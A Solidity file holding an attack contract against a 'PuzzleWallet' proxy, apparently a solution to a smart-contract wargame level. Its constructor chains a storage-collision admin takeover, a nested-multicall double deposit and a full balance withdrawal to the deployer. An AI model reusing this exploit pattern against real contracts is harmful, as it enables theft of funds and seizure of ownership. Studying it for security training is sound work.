// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
}

contract AttackWallet {
    constructor(address _wallet) payable {
        IPuzzleWallet wallet = IPuzzleWallet(_wallet);

        wallet.proposeNewAdmin(address(this));

        wallet.addToWhitelist(address(this));

        bytes[] memory secondMulticall = new bytes[](1);
        secondMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory firstMulticall = new bytes[](2);
        firstMulticall[0] = secondMulticall[0];
        firstMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, secondMulticall);

        wallet.multicall{value: address(wallet).balance}(firstMulticall);

        wallet.execute(msg.sender, address(wallet).balance, "");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        if (wallet.admin() != msg.sender) revert("attack failed");
    }
}
